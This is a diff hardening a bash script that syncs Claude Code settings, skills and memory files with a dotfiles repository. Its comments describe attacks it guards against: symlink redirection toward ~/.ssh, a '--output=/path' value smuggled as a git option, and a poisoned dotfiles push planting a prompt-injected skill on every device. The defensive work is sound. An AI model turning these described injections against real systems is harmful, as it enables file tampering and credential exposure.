+        _expected_repo="${DOTFILES_DIR}/${PRUNE_SUBPATH}"
+        if [ "$PRUNE_REPO" != "$_expected_repo" ]; then
+            echo "prune-apply: --repo-path must equal \$DOTFILES_DIR/\$SUBPATH (got: $PRUNE_REPO, expected: $_expected_repo)" >&2
+            exit 1
+        fi
+        # Defense-in-depth: the string check above pins the LOGICAL path,
+        # but a symlink COMPONENT inside $DOTFILES_DIR could still redirect the cp
+        # destination outside the dotfiles tree. Resolve realpath (gracefully
+        # resolves the not-yet-existing push target via its existing parents) and
+        # require containment under realpath($DOTFILES_DIR) — symmetric with the
+        # --local-path canonical check below.
+        _repo_check=$(python -I -c "
+import os, sys
+target = os.path.realpath(sys.argv[1])
+allowed = os.path.realpath(sys.argv[2])
+sep = os.sep
+print('OK' if target == allowed or target.startswith(allowed + sep) else 'NO')
+" "$(normalize_path "$PRUNE_REPO")" "$(normalize_path "$DOTFILES_DIR")" 2>/dev/null)
+        if [ "$_repo_check" != "OK" ]; then
+            echo "prune-apply: --repo-path 经 realpath 解析后不在 \$DOTFILES_DIR 内（疑似符号链接重定向）：$PRUNE_REPO" >&2
+            exit 1
+        fi
+    fi
+
+    _cc_home_check="${HOME}/.claude"
+    # The Python check now also prints the canonicalized path on success so
+    # we can use it (not the caller-supplied --local-path) for the actual
+    # rm/cp. Closes the TOCTOU window: a symlink swap between the
+    # containment check and the cp can't redirect reads outside ~/.claude
+    # when we cp from the realpath-resolved file directly. For rm, we keep
+    # using the caller path so a legitimate symlink-under-~/.claude is
+    # removed as a symlink (not having its target unlinked).
+    _local_check=$(python -I -c "
+import os, sys
+target = os.path.realpath(sys.argv[1])
+allowed = os.path.realpath(sys.argv[2])
+sep = os.sep
+if target == allowed or target.startswith(allowed + sep):
+    print('OK')
+    print(target)
+else:
+    print('NO')
+" "$(normalize_path "$PRUNE_LOCAL")" "$(normalize_path "$_cc_home_check")" 2>/dev/null)
+    _local_ok=$(printf '%s' "$_local_check" | head -1)
+    _local_resolved=$(printf '%s' "$_local_check" | tail -n +2)
+    if [ "$_local_ok" != "OK" ]; then
+        echo "prune-apply: --local-path must resolve under \$HOME/.claude (got: $PRUNE_LOCAL)" >&2
+        exit 1
+    fi
+
+    case "$PRUNE_ACTION" in
+        remove)
+            if [ -e "$PRUNE_LOCAL" ] || [ -L "$PRUNE_LOCAL" ]; then
+                # rm operates on the original path so a symlink at
+                # $PRUNE_LOCAL gets removed (not its target). The realpath
+                # containment check above already confirmed the symlink
+                # resolves under ~/.claude.
+                if rm -f "$PRUNE_LOCAL"; then
+                    _ledger_apply_single del "$PRUNE_SUBPATH" || true
+                    echo "已删除本地：$PRUNE_LOCAL"
+                else
+                    echo "rm 失败：$PRUNE_LOCAL" >&2
+                    exit 1
+                fi
+            else
+                _ledger_apply_single del "$PRUNE_SUBPATH" || true
+                echo "本地文件已不存在，已清理 ledger 条目"
+            fi
+            ;;
+        keep)
+            if [ ! -f "$_local_resolved" ]; then
+                echo "本地文件不存在，无法 keep" >&2
+                exit 1
+            fi
+            # Norm-aware hash so memory subpaths store the canonical form that
+            # matches the ledger written by Case 5 / Case 3a in the main flow.
+            # Hash the realpath-resolved file directly so a symlink swap
+            # between the containment check and the hash can't substitute
+            # outside-~/.claude content into the ledger.
+            _prune_norm=$(_infer_norm_from_subpath "$PRUNE_SUBPATH")
+            _kh=$(_norm_hash "$_local_resolved" "$_prune_norm")
+            # kept=1 — marks the entry kept_local_only so future Case 3 silently
+            # skips this file (a plain set entry would make the next sync miss
+            # the deletion and resurrect the file).
+            if _ledger_apply_single set "$PRUNE_SUBPATH" "$_kh" 1; then
+                echo "已保留本地，标记为 kept_local_only（下次 /sync 跳过此文件，不会再询问也不会推回）"
+            else
+                echo "ledger 写入失败" >&2
+                exit 1
+            fi
+            ;;
+        push)
+            if [ ! -f "$_local_resolved" ]; then
+                echo "本地文件不存在，无法 push" >&2
+                exit 1
+            fi
+            if [ -z "$PRUNE_REPO" ]; then
+                echo "prune-apply push 需要 --repo-path" >&2
+                exit 1
+            fi
+            if ! mkdir -p "$(dirname "$PRUNE_REPO")"; then
+                echo "无法创建 repo 目录 $(dirname "$PRUNE_REPO")" >&2
+                exit 1
+            fi
+            # If the repo file already exists (e.g., a teammate's push between
+            # this device's last pull and the prune-apply call), keep a .bak
+            # before overwrite — same posture as Case 5 CONFLICT resolution.
+            if [ -f "$PRUNE_REPO" ]; then
+                if ! _bak_path=$(_safe_bak "$PRUNE_REPO"); then
+                    echo "无法备份 $PRUNE_REPO，push 中止" >&2
+                    exit 1
+                fi
+                [ -n "$_bak_path" ] && echo "（已备份 repo 旧内容到 $_bak_path）"
+            fi
+            # cp source is the realpath-resolved file, not the caller path —
+            # closes the symlink-swap TOCTOU that would let an attacker read
+            # outside ~/.claude between the containment check and cp's
+            # independent symlink dereference.
+            if cp "$_local_resolved" "$PRUNE_REPO"; then
+                _prune_norm=$(_infer_norm_from_subpath "$PRUNE_SUBPATH")
+                _ph=$(_norm_hash "$_local_resolved" "$_prune_norm")
+                _ledger_apply_single set "$PRUNE_SUBPATH" "$_ph" || true
+                echo "已推回仓库：$PRUNE_REPO"
+                echo "（dotfiles 提交+推送需要下次 /sync 的 step 6 完成；本命令仅把内容写回工作树）"
+            else
+                echo "cp 失败" >&2
+                exit 1
+            fi
+            ;;
+        *)
+            echo "prune-apply: 未知 action [$PRUNE_ACTION]（允许 remove|keep|push）" >&2
+            exit 1
+            ;;
+    esac
+
+    exit 0
+fi
+
+# --- skill-import 子命令 ---
+# Mechanical executor for SKILL_IMPORT choices. A dotfiles-side custom skill
+# directory that's missing locally gates on user approval before mirror — a
+# compromised dotfiles push could otherwise drop an arbitrary new skill (with
+# prompt-injected SKILL.md frontmatter) onto every device on the next /sync.
+# Usage:
+#   sync.sh skill-import --action=accept --skill-name=<name>
+#   sync.sh skill-import --action=reject --skill-name=<name>
+if [ "${1:-}" = "skill-import" ]; then
+    shift
+    SKILL_ACTION=""
+    SKILL_NAME=""
+    while [ $# -gt 0 ]; do
+        case "$1" in
+            --action=*)     SKILL_ACTION="${1#--action=}" ;;
+            --skill-name=*) SKILL_NAME="${1#--skill-name=}" ;;
+            *)
+                echo "skill-import: 未知参数 $1" >&2
+                exit 1
+                ;;
+        esac
+        shift
+    done
+
+    if [ -z "$SKILL_ACTION" ] || [ -z "$SKILL_NAME" ]; then
+        echo "用法: sync.sh skill-import --action=<accept|reject> --skill-name=<name>" >&2
+        exit 1
+    fi
+
+    # Tight validator: first char alphanumeric (no leading - / .), then up to
+    # 63 chars of [A-Za-z0-9_.-]. Same shape as module-manager's
+    # _validate_module_name; rejects path traversal / control chars / shell
+    # metas. The destination cp/append is built by string-concatenation, so the
+    # validator IS the boundary.
+    if ! [[ "$SKILL_NAME" =~ ^[A-Za-z0-9][A-Za-z0-9_.-]{0,63}$ ]]; then
+        echo "skill-import: skill-name 含非法字符（仅允许 [A-Za-z0-9_.-]，首字符必须字母或数字，长度 1-64）" >&2
+        exit 1
+    fi
+
+    case "$SKILL_ACTION" in
+        accept)
+            _src="${DOTFILES_DIR}/claude/skills/${SKILL_NAME}"
+            _dst="${HOME}/.claude/skills/${SKILL_NAME}"
+            if [ ! -d "$_src" ]; then
+                echo "skill-import: 源目录不存在 $_src" >&2
+                exit 1
+            fi
+            # Reject symlink as src — same threat model as sync_custom_skills'
+            # in-loop [-L] guard. A dotfiles-side `skills/foo -> /home/user/.ssh`
+            # would otherwise mirror outside content into ~/.claude/skills/foo.
+            if [ -L "$_src" ]; then
+                echo "skill-import: 拒绝镜像 symlink 目录 $_src" >&2
+                exit 1
+            fi
+            if [ -e "$_dst" ]; then
+                echo "skill-import: 目标已存在 $_dst（用 /sync 走文件级同步即可，不必再走 import）" >&2
+                exit 1
+            fi
+            # Ensure ~/.claude/skills/ exists — first-import-on-fresh-machine
+            # may hit this before any other skill was ever installed.
+            if ! mkdir -p -- "${HOME}/.claude/skills"; then
+                echo "skill-import: 无法创建 ~/.claude/skills/" >&2
+                exit 1
+            fi
+            # Refuse if the source contains any nested symlinks. Stripping
+            # AFTER cp (the previous approach) left a TOCTOU window in which
+            # intra-process consumers (sync_config_file's per-file pass in
+            # sync_custom_skills' fall-through) could read through the
+            # symlinks before the find -delete sweep fired. Scanning first
+            # and refusing on hit leaves the dotfiles tree untouched.
+            if _has_symlinks "$_src"; then
+                echo "skill-import: 拒绝导入——源目录含嵌套符号链接 (skill: $SKILL_NAME)" >&2
+                echo "skill-import: 请先清理 dotfiles 仓库中 $_src 下的符号链接再重试" >&2
+                exit 1
+            fi
+            # cp -a preserves attributes without dereferencing — the scan
+            # above already proved there's nothing to dereference.
+            if ! cp -a -- "$_src" "$_dst"; then
+                echo "skill-import: cp 失败" >&2
+                exit 1
+            fi
+            # Belt-and-braces: a separate process editing the dotfiles tree
+            # between scan and cp could introduce symlinks; this sweep is a
+            # no-op when scan passed and the source stays put.
+            find "$_dst" -type l -delete 2>/dev/null || true
+            echo "已导入 skill: $SKILL_NAME"
+            ;;
+        reject)
+            _ignore_file="$SKILL_IGNORE_FILE"
+            # Avoid duplicate entries; ensure trailing newline before append.
+            if [ -f "$_ignore_file" ] && grep -Fxq -- "$SKILL_NAME" "$_ignore_file"; then
+                echo "skill-import: $SKILL_NAME 已在 .skill_import_ignore 中"
+                exit 0
+            fi
+            if [ -f "$_ignore_file" ] && [ -n "$(tail -c 1 "$_ignore_file" 2>/dev/null)" ]; then
+                printf '\n' >> "$_ignore_file"
+            fi
+            printf '%s\n' "$SKILL_NAME" >> "$_ignore_file"
+            echo "已将 $SKILL_NAME 加入 .skill_import_ignore（后续 /sync 不再询问）"
+            ;;
+        *)
+            echo "skill-import: 未知 action [$SKILL_ACTION]（允许 accept|reject）" >&2
+            exit 1
+            ;;
+    esac
+
+    exit 0
+fi
+
 # 在多个 workspace root 中查找仓库目录（step 2 memory 同步 + step 3 均需要）
 _find_repo_dir() {
     local repo_name="$1"
@@ -669,6 +1452,10 @@ if [ -z "$SYNC_TMPDIR" ] || [ ! -d "$SYNC_TMPDIR" ]; then
 fi
 trap 'rm -rf "$SYNC_TMPDIR"' EXIT
 
+# Ledger buffer lives in the same tmpdir as repo result files; cleaned up by
+# the trap above. Helpers no-op when this is empty (e.g., before tmpdir exists).
+_LEDGER_BUFFER="${SYNC_TMPDIR}/ledger_buffer.txt"
+
 echo "========================================="
 echo " Claude Code Workspace Sync"
 echo "========================================="
@@ -682,7 +1469,10 @@ declare -A REPO_URLS
 
 if [ "${ENABLE_REPO_SYNC:-false}" != "true" ]; then
     # Config-only mode: only find dotfiles repo
-    if ! REPOS_JSON=$("$GH" repo list "$GITHUB_USER" --json name,url --limit 1000 2>/dev/null); then
+    if [ "${SYNC_TEST_MODE:-}" = "1" ]; then
+        # Test mode: synthesize a single-repo JSON for the test dotfiles
+        REPOS_JSON="[{\"name\":\"${DOTFILES_REPO}\",\"url\":\"file://${DOTFILES_PATH}\"}]"
+    elif ! REPOS_JSON=$("$GH" repo list "$GITHUB_USER" --json name,url --limit 1000 2>/dev/null); then
         echo -e "${RED}错误：无法获取仓库列表。${NC}" >&2
         exit 1
     fi
@@ -713,18 +1503,13 @@ else
         exit 1
     fi
 
-    # 读取 .sync_ignore（永久忽略的仓库列表）
+    # 读取 .sync_ignore（永久忽略的仓库列表）via the shared _read_ignore_file
+    # helper — same parser as .skill_import_ignore, so the two stay symmetric.
     IGNORE_FILE="${SCRIPT_DIR}/.sync_ignore"
-    IGNORED_LIST=""
+    IGNORED_LIST=$(_read_ignore_file "$IGNORE_FILE")
     N_IGNORED=0
-    if [ -f "$IGNORE_FILE" ]; then
-        # 第三轮过滤：只保留符合 GitHub repo 名规范的行（字母/数字/下划线/连字符/点）。
-        # 防御一个被篡改的 .sync_ignore（如远端被攻击）混入控制字符或路径分隔符
-        IGNORED_LIST=$(grep -v '^[[:space:]]*#' "$IGNORE_FILE" | grep -v '^[[:space:]]*$' \
-            | tr -d '\r' | grep -E '^[A-Za-z0-9_.-]+$' || true)
-        if [ -n "$IGNORED_LIST" ]; then
-            N_IGNORED=$(echo "$IGNORED_LIST" | wc -l | tr -d ' ')
-        fi
+    if [ -n "$IGNORED_LIST" ]; then
+        N_IGNORED=$(echo "$IGNORED_LIST" | wc -l | tr -d ' ')
     fi
 
     # 筛选带有指定 topic 的仓库（用 python 解析 JSON，因为 Git Bash 没有 jq）
@@ -793,10 +1578,10 @@ for repo in data:
         ORPHAN_FOUND=0
         # Build a SEPARATE set for orphan suppression. Do NOT merge
         # .sync_ignore into KNOWN_REPOS — that set is also iterated by step 2's
-        # memory sync (sync_memory_dir), so adding ignored repos there would
-        # copy their Claude project memory into dotfiles and push to the
-        # remote, defeating the purpose of .sync_ignore for any repo whose
-        # CC project hash exists locally.
+        # memory sync (sync_memory_dir, ~line 1482), so adding ignored repos
+        # there would copy their Claude project memory into dotfiles and push
+        # to the remote, defeating the purpose of .sync_ignore for any repo
+        # whose CC project hash exists locally.
         declare -A IGNORED_SET
         while IFS= read -r ignored_name; do
             [ -n "$ignored_name" ] && IGNORED_SET["$ignored_name"]=1
@@ -862,7 +1647,13 @@ sync_commit_push() {
     # `:!**/*.bak` pathspec only matches paths that contain a directory separator;
     # without the second pathspec `:!*.bak`, top-level files like `settings.json.bak`
     # / `.env.bak` / `secrets.bak` slip past and get auto-committed-and-pushed.
-    git add -A -- ':!**/*.bak' ':!*.bak'
+    # The `.bak.*` variants catch _safe_bak's timestamp fallback (`<file>.bak.<epoch>`)
+    # — without those, a fallback backup created during prune-apply
+    # push or interactive CONFLICT would propagate into the dotfiles repo and from
+    # there to every other device. Status filter at step 6 must stay in lockstep
+    # with this glob set; see the python block that checks `.endswith(b".bak")` /
+    # `b".bak." in basename`.
+    git add -A -- ':!**/*.bak' ':!*.bak' ':!**/*.bak.*' ':!*.bak.*'
     if ! git commit -m "sync: auto commit from $(hostname)"; then
         echo -e "${RED}${label} commit 失败${NC}" >&2
         HAS_ERROR=1
@@ -910,14 +1701,21 @@ _files_equivalent() {
     # -I (isolated mode): drops CWD from sys.path so an attacker-placed
     # re.py / sys.py in the dotfiles repo (CWD here is $DOTFILES_DIR via
     # the pushd in step 2) cannot shadow stdlib imports.
+    # CRLF-tolerant regex: CC harness on Windows may write memory files with
+    # \r\n line endings; the original `[^\n]*\n?` would leave the \r in
+    # place, causing spurious "different" classifications across mixed-LE
+    # devices. `\r?\n` matches both LF and CRLF inside the frontmatter
+    # boundary, while `[^\r\n]*` clamps the originSessionId line to a
+    # single physical line regardless of separator. Must stay in sync with
+    # _norm_hash's regex — see the warning in that helper's docstring.
     python -I -c "
 import sys, re
 def load(p):
     with open(p, 'r', encoding='utf-8') as f:
         return f.read()
 def norm_memory(t):
-    t = re.sub(r'^originSessionId:[^\n]*\n?', '', t, flags=re.MULTILINE)
-    t = re.sub(r'^(---\n.*?\n---\n)\n', r'\1', t, count=1, flags=re.DOTALL)
+    t = re.sub(r'^originSessionId:[^\r\n]*\r?\n?', '', t, flags=re.MULTILINE)
+    t = re.sub(r'^(---\r?\n.*?\r?\n---\r?\n)\r?\n', r'\1', t, count=1, flags=re.DOTALL)
     return t
 a, b = load(sys.argv[1]), load(sys.argv[2])
 if sys.argv[3] == 'memory':
@@ -949,7 +1747,150 @@ sync_config_file() {
     # 只有一边存在：复制到另一边
     if [ ! -f "$REPO_FILE" ] && [ ! -f "$LOCAL_FILE" ]; then return; fi
     if [ ! -f "$REPO_FILE" ] && [ -f "$LOCAL_FILE" ]; then
+        # Case 3: local has, repo doesn't. Three sub-paths, in order:
+        #   - kept_local_only=1   → silent skip (user already chose Keep)
+        #   - ledger entry exists → always emit PRUNE (never silent push)
+        #   - no ledger entry     → Case 3a: genuinely new local file, push up
+        local _subpath="${REPO_FILE#"${DOTFILES_DIR}"/}"
+        local _entry
+        _entry=$(_ledger_get_entry "$_subpath")
+
+        if [ -n "$_entry" ]; then
+            local _ledger_sha _ledger_hash _ledger_kept
+            IFS=$'\t' read -r _ledger_sha _ledger_hash _ledger_kept <<< "$_entry"
+
+            # Already-kept entries: user previously chose Keep. Don't re-prompt,
+            # don't push — a fall-through that silently pushes recreates the
+            # "Keep then resync resurrects" bounce.
+            if [ "${_ledger_kept:-0}" = "1" ]; then
+                echo -e "  ${NC}  $LABEL: 本地保留 (kept_local_only, 跳过)"
+                CFG_SKIPPED=$((CFG_SKIPPED+1))
+                return
+            fi
+
+            # Look up the deletion that the ledger anchor predates.
+            local _del_line=""
+            # Validate the ledger SHA before it reaches the git log REV-RANGE: the
+            # pathspec is protected by -- but the rev-range arg is not, and
+            # .sync_state.json is a tamper surface (we validate subpaths at every
+            # write boundary for the same reason). A non-hex value like
+            # "--output=/path" would be parsed by git log as an option — a
+            # constrained arbitrary-file-write — not a rev.
+            if [ -n "$_ledger_sha" ] && [[ ! "$_ledger_sha" =~ ^[0-9a-fA-F]{4,40}$ ]]; then
+                echo -e "  ${YELLOW}  $LABEL: ledger SHA 格式非法（疑似篡改），跳过删除检测${NC}" >&2
+                _ledger_sha=""
+            fi
+            if [ -n "$_ledger_sha" ] && [ -d "$DOTFILES_DIR" ]; then
+                # %H|%ci|%s — first delete commit after ledger SHA; %s is single-line subject
+                _del_line=$(git -C "$DOTFILES_DIR" log --diff-filter=D --pretty='%H|%ci|%s' "${_ledger_sha}..HEAD" -- "$_subpath" 2>/dev/null | head -1)
+            fi
+
+            local _local_hash _variant _del_sha _del_time _del_msg
+            # Norm-aware hash so memory files compare against the
+            # canonical-form ledger entry written by Case 5 / Case 3a, not
+            # the raw bytes that always differ via originSessionId.
+            _local_hash=$(_norm_hash "$LOCAL_FILE" "$NORM")
+
+            if [ -n "$_del_line" ]; then
+                # Normal case: deletion commit identified after ledger SHA.
+                IFS='|' read -r _del_sha _del_time _del_msg <<< "$_del_line"
+                _del_msg=$(printf '%s' "$_del_msg" | tr -d '\r\n')
+                _del_msg=${_del_msg:0:200}
+                if [ "$_local_hash" = "$_ledger_hash" ]; then
+                    _variant="pure-zombie"   # Local unchanged — Remove is safe
+                else
+                    _variant="real-conflict" # Local edited offline AND upstream deleted — Show first
+                fi
+            else
+                # Anchor lost: ledger has entry but no deletion in ledger_sha..HEAD.
+                # Common causes: dotfiles history was force-pushed / rewritten,
+                # ledger SHA orphaned, or a Keep entry predating deletion-anchor
+                # tracking. Still emit PRUNE so the user decides; never silently
+                # push (silent push is how deletions got resurrected).
+                _del_sha="(unknown)"
+                _del_time="(unknown)"
+                _del_msg="dotfiles 历史可能被改写或 ledger SHA 已失效"
+                if [ "$_local_hash" = "$_ledger_hash" ]; then
+                    _variant="anchor-lost-pure"
+                else
+                    _variant="anchor-lost-edited"
+                fi
+            fi
+
+            if [ "$INTERACTIVE" = true ]; then
+                echo -e "  ${YELLOW}!${NC} $LABEL: 仓库已删除/失踪此文件，但本地仍存在 (${_variant})"
+                echo "    仓库删除提交: $_del_sha"
+                echo "    时间:        $_del_time"
+                echo "    消息:        $_del_msg"
+                echo "    选项:"
+                echo "      r) Remove 本地（与仓库一致）"
+                echo "      k) Keep   本地保留，标记 kept_local_only 不再询问"
+                echo "      p) Push   推回仓库（覆盖删除）"
+                echo "      s) Show   显示本地内容（前 200 行），不做决策"
+                read -r -p "    选择 [k]: " _PRUNE_CHOICE
+                case "$_PRUNE_CHOICE" in
+                    r|R)
+                        if rm -f "$LOCAL_FILE"; then
+                            _ledger_buffer_del "$_subpath"
+                            echo -e "  ${GREEN}✓${NC} $LABEL: 已删除本地"
+                            CFG_SYNCED=$((CFG_SYNCED+1))
+                        else
+                            echo -e "  ${RED}✗${NC} $LABEL: rm 失败"
+                            CFG_FAIL=$((CFG_FAIL+1)); HAS_ERROR=1
+                        fi
+                        ;;
+                    p|P)
+                        if mkdir -p "$(dirname "$REPO_FILE")" && cp "$LOCAL_FILE" "$REPO_FILE"; then
+                            _ledger_buffer_set "$_subpath" "$_local_hash" 0
+                            echo -e "  ${GREEN}→${NC} $LABEL: 已推回仓库 (dotfiles commit-push 由 step 6 完成)"
+                            CFG_SYNCED=$((CFG_SYNCED+1))
+                        else
+                            echo -e "  ${RED}✗${NC} $LABEL: push back 失败"
+                            CFG_FAIL=$((CFG_FAIL+1)); HAS_ERROR=1
+                        fi
+                        ;;
+                    s|S)
+                        echo "    ---- $LOCAL_FILE (前 200 行) ----"
+                        head -200 "$LOCAL_FILE"
+                        echo "    ---- end ----"
+                        # Show is non-terminal: re-emit conflict, user re-runs sync to pick again
+                        CFG_CONFLICT=$((CFG_CONFLICT+1))
+                        ;;
+                    *)
+                        # Default = Keep: mark kept_local_only so future syncs silently skip.
+                        # Store the current local hash (norm-aware) so this path
+                        # matches `sync.sh prune-apply --action=keep` — both
+                        # entry points must produce the same on-disk ledger.
+                        _ledger_buffer_set "$_subpath" "$(_norm_hash "$LOCAL_FILE" "$NORM")" 1
+                        echo -e "  ${NC}  $LABEL: 保留本地，标记 kept_local_only"
+                        CFG_SKIPPED=$((CFG_SKIPPED+1))
+                        ;;
+                esac
+            else
+                # Non-interactive: emit PRUNE block for SKILL.md → AskUserQuestion.
+                # SKILL.md applies the choice via `sync.sh prune-apply` (no inline ledger write here).
+                # User-controlled fields (LABEL, REPO, LOCAL, SUBPATH, DELETED_REASON)
+                # are pre-JSON-escaped so the SKILL.md side can interpolate verbatim.
+                echo "===PRUNE_BEGIN==="
+                echo "LABEL: $(_json_escape "$LABEL")"
+                echo "REPO: $(_json_escape "$REPO_FILE")"
+                echo "LOCAL: $(_json_escape "$LOCAL_FILE")"
+                echo "SUBPATH: $(_json_escape "$_subpath")"
+                echo "VARIANT: $_variant"
+                echo "DELETED_IN_COMMIT: $_del_sha"
+                echo "DELETED_AT: $(_json_escape "$_del_time")"
+                echo "DELETED_REASON: $(_json_escape "$_del_msg")"
+                echo "LOCAL_HASH: $_local_hash"
+                echo "LEDGER_HASH: $_ledger_hash"
+                echo "===PRUNE_END==="
+                CFG_CONFLICT=$((CFG_CONFLICT+1))
+            fi
+            return
+        fi
+
+        # Case 3a: no ledger entry — genuinely new local file. Push up.
         if _sync_one_way "$LOCAL_FILE" "$REPO_FILE" "$LABEL: 本地新增，同步到仓库" "${GREEN}→${NC}"; then
+            _ledger_buffer_set "${REPO_FILE#"${DOTFILES_DIR}"/}" "$(_norm_hash "$LOCAL_FILE" "$NORM")" 0
             CFG_SYNCED=$((CFG_SYNCED+1))
         else
             # 文件系统/权限错误不是内容冲突，走 CFG_FAIL 桶而非 CFG_CONFLICT
@@ -970,10 +1911,11 @@ sync_config_file() {
             if [ "$INTERACTIVE" = true ]; then
                 echo -e "  ${YELLOW}!${NC} $LABEL: 本地不存在，dotfiles 中有该文件（${REPO_LINES} 行，${REPO_TIME}）"
                 echo "    本文件控制 Claude 行为，新设备首次导入也需要你确认。"
-                read -p "    导入到 ${LOCAL_FILE}？(y/N): " _IMP
+                read -r -p "    导入到 ${LOCAL_FILE}？(y/N): " _IMP
                 case "$_IMP" in
                     y|Y)
                         if _sync_one_way "$REPO_FILE" "$LOCAL_FILE" "$LABEL: 已导入" "${GREEN}←${NC}"; then
+                            _ledger_buffer_set "${REPO_FILE#"${DOTFILES_DIR}"/}" "$(_norm_hash "$REPO_FILE" "$NORM")"
                             CFG_SYNCED=$((CFG_SYNCED+1))
                         else
                             CFG_FAIL=$((CFG_FAIL+1)); HAS_ERROR=1
@@ -986,11 +1928,12 @@ sync_config_file() {
                 esac
             else
                 # 非交互：emit IMPORT 块，由 SKILL.md 调 AskUserQuestion 决策
+                # User-controlled fields pre-JSON-escaped (see _json_escape contract).
                 echo "===IMPORT_BEGIN==="
-                echo "LABEL: $LABEL"
-                echo "REPO: $REPO_FILE"
-                echo "LOCAL: $LOCAL_FILE"
-                echo "REPO_TIME: $REPO_TIME"
+                echo "LABEL: $(_json_escape "$LABEL")"
+                echo "REPO: $(_json_escape "$REPO_FILE")"
+                echo "LOCAL: $(_json_escape "$LOCAL_FILE")"
+                echo "REPO_TIME: $(_json_escape "$REPO_TIME")"
                 echo "REPO_LINES: $REPO_LINES"
                 echo "REASON: sensitive (controls Claude behavior — confirm before importing)"
                 echo "===IMPORT_END==="
@@ -999,6 +1942,7 @@ sync_config_file() {
             return
         fi
         if _sync_one_way "$REPO_FILE" "$LOCAL_FILE" "$LABEL: 仓库新增，同步到本地" "${GREEN}←${NC}"; then
+            _ledger_buffer_set "${REPO_FILE#"${DOTFILES_DIR}"/}" "$(_norm_hash "$REPO_FILE" "$NORM")"
             CFG_SYNCED=$((CFG_SYNCED+1))
         else
             CFG_FAIL=$((CFG_FAIL+1))
@@ -1010,6 +1954,12 @@ sync_config_file() {
     # 两边都存在：比较内容（memory 模式会忽略 originSessionId 元数据差异）
     if _files_equivalent "$REPO_FILE" "$LOCAL_FILE" "$NORM"; then
         echo "  = $LABEL: 无差异"
+        # Ledger catch-up: record agreement so future Case 3 PRUNE checks can
+        # distinguish zombies from genuinely-new files. Norm-aware so memory
+        # files store the canonical hash that the matching Case 3 lookup will
+        # produce (raw REPO-byte hashes would always differ from LOCAL bytes
+        # via originSessionId, mis-flagging zombies).
+        _ledger_buffer_set "${REPO_FILE#"${DOTFILES_DIR}"/}" "$(_norm_hash "$REPO_FILE" "$NORM")"
         CFG_SKIPPED=$((CFG_SKIPPED+1))
         return
     fi
@@ -1036,7 +1986,7 @@ sync_config_file() {
         echo "    Repo:  $REPO_TIME"
         echo "    Local: $LOCAL_TIME"
         echo ""
-        read -p "    选择: (r)epo 优先 / (l)ocal 优先 / (s)kip 下次再问 [s]: " CHOICE
+        read -r -p "    选择: (r)epo 优先 / (l)ocal 优先 / (s)kip 下次再问 [s]: " CHOICE
     else
         # Non-interactive mode (Claude Code): structured conflict block
         # Format consumed by SKILL.md → AskUserQuestion flow
@@ -1051,12 +2001,16 @@ sync_config_file() {
         local REPO_LINES LOCAL_LINES
         REPO_LINES=$(wc -l < "$REPO_FILE" 2>/dev/null | tr -d ' ' || echo "?")
         LOCAL_LINES=$(wc -l < "$LOCAL_FILE" 2>/dev/null | tr -d ' ' || echo "?")
+        # User-controlled fields pre-JSON-escaped (see _json_escape contract).
+        # DIFF body stays raw — it's --show-diff opt-in, the indent already
+        # prevents column-0 marker collisions, and SKILL.md only ever puts
+        # diff lines into `preview` after explicit user request.
         echo "===CONFLICT_BEGIN==="
-        echo "LABEL: $LABEL"
-        echo "REPO: $REPO_FILE"
-        echo "LOCAL: $LOCAL_FILE"
-        echo "REPO_TIME: $REPO_TIME"
-        echo "LOCAL_TIME: $LOCAL_TIME"
+        echo "LABEL: $(_json_escape "$LABEL")"
+        echo "REPO: $(_json_escape "$REPO_FILE")"
+        echo "LOCAL: $(_json_escape "$LOCAL_FILE")"
+        echo "REPO_TIME: $(_json_escape "$REPO_TIME")"
+        echo "LOCAL_TIME: $(_json_escape "$LOCAL_TIME")"
         echo "REPO_LINES: $REPO_LINES"
         echo "LOCAL_LINES: $LOCAL_LINES"
         if [ "$SHOW_DIFF" = true ]; then
@@ -1071,16 +2025,33 @@ sync_config_file() {
     fi
     case "$CHOICE" in
         r|R)
-            cp "$LOCAL_FILE" "${LOCAL_FILE}.bak"
-            cp "$REPO_FILE" "$LOCAL_FILE"
-            echo -e "  ${GREEN}←${NC} $LABEL: 使用 repo 版本 (本地已备份 .bak)"
-            CFG_SYNCED=$((CFG_SYNCED+1))
+            # _safe_bak rc=1 means both the primary .bak slot AND the
+            # .bak.<epoch> fallback are occupied (a symlink-occupied fallback
+            # is an attack pattern, not an accident). The earlier `|| true` swallowed the
+            # refusal and ran cp without a backup, then lied "本地已备份到
+            # .bak". Refuse the merge instead — the user can resolve manually.
+            if ! _bak_path=$(_safe_bak "$LOCAL_FILE"); then
+                echo -e "  ${RED}✗${NC} $LABEL: 无法分配 .bak 路径（疑似预置 symlink），跳过本次合并" >&2
+                CFG_FAIL=$((CFG_FAIL+1))
+                HAS_ERROR=1
+            else
+                cp "$REPO_FILE" "$LOCAL_FILE"
+                _ledger_buffer_set "${REPO_FILE#"${DOTFILES_DIR}"/}" "$(_norm_hash "$REPO_FILE" "$NORM")"
+                echo -e "  ${GREEN}←${NC} $LABEL: 使用 repo 版本 (本地已备份到 ${_bak_path})"
+                CFG_SYNCED=$((CFG_SYNCED+1))
+            fi
             ;;
         l|L)
-            cp "$REPO_FILE" "${REPO_FILE}.bak"
-            cp "$LOCAL_FILE" "$REPO_FILE"
-            echo -e "  ${GREEN}→${NC} $LABEL: 使用本地版本 (repo 已备份 .bak)"
-            CFG_SYNCED=$((CFG_SYNCED+1))
+            if ! _bak_path=$(_safe_bak "$REPO_FILE"); then
+                echo -e "  ${RED}✗${NC} $LABEL: 无法分配 .bak 路径（疑似预置 symlink），跳过本次合并" >&2
+                CFG_FAIL=$((CFG_FAIL+1))
+                HAS_ERROR=1
+            else
+                cp "$LOCAL_FILE" "$REPO_FILE"
+                _ledger_buffer_set "${REPO_FILE#"${DOTFILES_DIR}"/}" "$(_norm_hash "$LOCAL_FILE" "$NORM")"
+                echo -e "  ${GREEN}→${NC} $LABEL: 使用本地版本 (repo 已备份到 ${_bak_path})"
+                CFG_SYNCED=$((CFG_SYNCED+1))
+            fi
             ;;
         *)
             echo -e "  ${NC}  $LABEL: 已跳过 (无修改)"
@@ -1152,17 +2123,37 @@ sync_custom_skills() {
     local MANIFEST_PY
     MANIFEST_PY=$(normalize_path "$MANIFEST")
 
-    # Step A: 从 modules.toml 提取第三方 skill 名列表
+    # Step A: 从 modules.toml 提取第三方 skill 名列表。
+    # 用 tomllib 真正解析，避免 regex 误把模块名内的 '.' 当 sub-table 分隔符
+    # （module-manager 的 _validate_module_name 允许 [A-Za-z0-9_.-]，例如
